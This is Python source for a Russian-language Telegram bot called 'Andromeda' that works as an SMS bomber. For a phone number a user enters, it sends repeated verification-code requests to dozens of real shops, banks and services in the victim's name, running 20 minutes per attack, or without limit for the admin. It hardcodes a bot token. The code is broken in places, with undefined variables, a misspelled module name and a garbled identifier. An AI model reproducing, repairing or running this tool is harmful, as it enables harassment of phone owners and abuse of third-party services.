 # coding=utf8
import requests
import threading
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import time


# Нужно вписать токет своего бота.
TOKEN = '772006356:AAGX_VubxlywRZLzRpU1GBKFKy8DTTZ653I'

# Можно уменьшить количество потоков-исполнителем этой переменной. Не знаю возможности системы так что ставлю 20
THREADS_LIMIT = 400

chat_ids_file = 'chat_ids.txt'

# Нужно вписать айди админского чата
ADMIN_CHAT_ID = 998991611

# Эти переменные лучше не менять
users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []


def save_chat_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    with open(chat_ids_file,"a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return


def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]


def start(message):
    keyboard = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    boom = telebot.types.KeyboardButton(text='🔥💣БОМБЕР')
    stop = telebot.types.KeyboardButton(text='Стоп Спам')
    info = telebot.types.KeyboardButton(text='ℹ️Информация')
    stats = telebot.types.KeyboardButton(text='📈Статистика')
    donat = telebot.types.KeyboardButton(text='💰Поддержать')
    piar = telebot.types.KeyboardButton(text='💸 Реклама')
    faq = telebot.types.KeyboardButton(text='FAQ / Соглашение')

    buttons_to_add = [boom, stop, info, stats, donat, piar, faq]

    if int(message.chat.id) == ADMIN_CHAT_ID:
        buttons_to_add.append(telebot.types.KeyboardButton(text='Рассылка'))

    keyboard.add(*buttons_to_add)
    bot.send_message(message.chat.id, 'Добро пожаловать🙋‍♂!\nВыберите действие:',  reply_markup=keyboard)
    save_chat_id(message.chat.id)


def send_for_number(phone):
        request_timeout = 0.00001
        try:
            requests.post('https://mcdonalds.ru/api/auth/code', json={'phone': '+' + _phone})
        except Exception as e:
            pass
        except Exception as e:
            pass
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': self.formatted_phone})
        except Exception as e:
            pass
        try:
            requsets.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
                          data={'name': self.sms_text, 'phone': self.formatted_phone})
        except Exception as e:
            pass
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                              params={'pageName': 'registerPrivateUserPhoneVerification'}, data={'phone': phone})
        except Exception as e:
            pass
        try:
            requests.post('https://api-ru-manage.voximplant.com/api/AddAccount',data={'region': 'eu', 'account_name': _name, 'language_code': 'en','account_email': _name + '@gmail.com', 'account_password': _name})
        except Exception as e:
            pass
        try:
            requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':_phone})
        except Exception as e:
            pass
        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
        except Exception as e:
            pass
        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
        except Exception as e:
            pass
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
        except Exception as e:
            pass
        try:
            requests.get(' https://findclone.ru/register?phone=+'+_phone, params={'phone': '+'+_phone})
        except Exception as e:
            pass
        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
        except Exception as e:
            pass
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
        except Exception as e:
            pass
        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
        except Exception as e:
            pass
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': '+7 915 3509908','g-recaptcha-response': '','recaptcha': 'on'})
        except Exception as e:
            pass
        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
        except Exception as e:
            pass
        try:
            requests.get('https://www.s7.ru/dotCMS/priority/ajaxEnrollment',params={'dispatch': 'shortEnrollmentByPhone', 'mobilePhone.countryCode': '7','mobilePhone.areaCode': _phone[1:4], 'mobilePhone.localNumber': _phone[4:-1]})
        except Exception as e:
            pass
        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
        except Exception as e:
            pass
        try:
            requests.post('https://gorzdrav.org/login/register/sms/send', data={'phone': _phoneGorzdrav, 'CSRFToken': '*'})	
        except Exception as e:
            pass
        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
        except Exception as e:
            pass
        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
        except Exception as e:
            pass
        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
        except Exception as e:
            pass
        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
        except Exception as e:
            pass
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
        except Exception as e:
            pass
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})  
        except Exception as e:
            pass
  

def start_spam(chat_id, phone_number, force):
    running_spams_per_chat_id.append(chat_id)

    if force:
        msg = f'Спам запущен на неограниченое время для номера +{phone_number}'
    else:
         msg = f'Спам запущен на 20 минут на номер +{phone_number}'

    bot.send_message(chat_id, msg)
    end = datetime.now() + timedelta(minutes = 20)
    while (datetime.now() < end) or (force and chat_id==ADMIN_CHAT_ID):
        if chat_id not in running_spams_per_chat_id:
            break
        send_for_number(phone_number)
    bot.send_message(chat_id, f'Спам на номер {phone_number} завершён')
    THREADS_AMOUNT[0] -= 1 # стояло 1
    try:
        running_spams_per_cзнhat_id.remove(chat_id)
    except Exception:
        pass


def spam_handler(phone, chat_id, force):
    if int(chat_id) in running_spams_per_chat_id:
        bot.send_message(chat_id, 'Вы уже начали рассылку спама. Дождитесь окончания или нажмите Стоп Спам и поробуйте снова')
        return

    # Если количество тредов меньше максимального создается новый который занимается спамом
    if THREADS_AMOUNT[0] < THREADS_LIMIT:
        x = threading.Thread(target=start_spam, args=(chat_id, phone, force))
        threads.append(x)
        THREADS_AMOUNT[0] += 1
        x.start()
    else:
        bot.send_message(chat_id, 'Сервера сейчас перегружены. Попытайтесь снова через несколько минут')
        print('Максимальное количество тредов исполняется. Действие отменено.')


@bot.message_handler(content_types=['text'])
def handle_message_received(message):
    chat_id = int(message.chat.id)
    text = message.text

    if text == 'ℹ️Информация':
        bot.send_message(chat_id, 'Создатель бота: @T4Modsik\nПо вопросам сотрудничества обращаться в ЛС к создателю бота')

    elif text == '🔥💣БОМБЕР':
        bot.send_message(chat_id, 'Введите номер без + в формате:\n🇺🇦 380xxxxxxxxx\n🇷🇺 79xxxxxxxxx')

    elif text == '📈Статистика':
        bot.send_message(chat_id, f'📊Статистика отображается в реальном времени📡!\nПользователей🙎‍♂: {users_amount[0]}\nСервисов для RU🇷🇺: 51\nСервисов для UK🇺🇦: 32\nБот запущен: 02.03.2020')

    elif text == '💰Поддержать':
        bot.send_message(chat_id, 'Ребята, кто может материально помочь на развитие бота\nВот реквизиты\nQIWI T4Mods')
    
    elif text == '💸 Реклама':
        bot.send_message(chat_id, 'В Нашем Боте 1 рассылка стоит 25 рублей\nЕе получат все пользователи бота\nПо вопросам покупки писать @T4Modsik')    

    elif text == 'Рассылка' and chat_id==ADMIN_CHAT_ID:
        bot.send_message(chat_id, 'Введите сообщение в формате: "РАЗОСЛАТЬ: ваш_текст" без кавычек')

    elif text == 'FAQ / Соглашение':
        bot.send_message(chat_id, '"Andromeda" предлагается Вашему вниманию при условии Вашего полного согласия со всеми правилами. При доступе или использовании данного сервиса каким-либо образом Вы даете согласие действовать в рамках Пользовательского соглашения\nПОЛЬЗОВАТЕЛЬСКОЕ СОГЛАШЕНИЕ\n1.Настоящее Пользовательское соглашение (далее – Соглашение) относится к сервису информационно-развлекательного ресурса "Andromeda"\n2.Доступ к сервису предоставляется на бесплатной основе.\n3."Andromeda" сервис предназначен исключительно для развлекательных целей.\n4.На Администрацию сервиса не возлагается каких-либо обязательств перед пользователями.\n5.Администрация сайта не принимает встречные предложения от Пользователей относительно изменений настоящего Пользовательского соглашения.\n6.Администрация сервиса "Andromeda" Не несет ответственности за причиненный ущерб третьим лицам попавших под влияние сервиса.\nСпасибо за внимание!')

    
    elif text == 'Стоп Спам':
        if chat_id not in running_spams_per_chat_id:
            bot.send_message(chat_id, 'Вы еще не начинали спам')
        else:
            running_spams_per_chat_id.remove(chat_id)

    elif 'РАЗОСЛАТЬ: ' in text and chat_id==ADMIN_CHAT_ID:
        msg = text.replace("РАЗОСЛАТЬ: ","")
        send_message_users(msg)

    elif len(text) == 11:
        phone = text
        spam_handler(phone, chat_id, force=False)


    elif len(text) == 12:
        phone = text
        spam_handler(phone, chat_id, force=False)



    elif len(text) == 12 and chat_id==ADMIN_CHAT_ID and text[0]=='_':
        phone = text[1:]
        spam_handler(phone, chat_id, force=True)

    else:
        bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
        print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')

if __name__ == '__main__':
    bot.polling(none_stop=True)
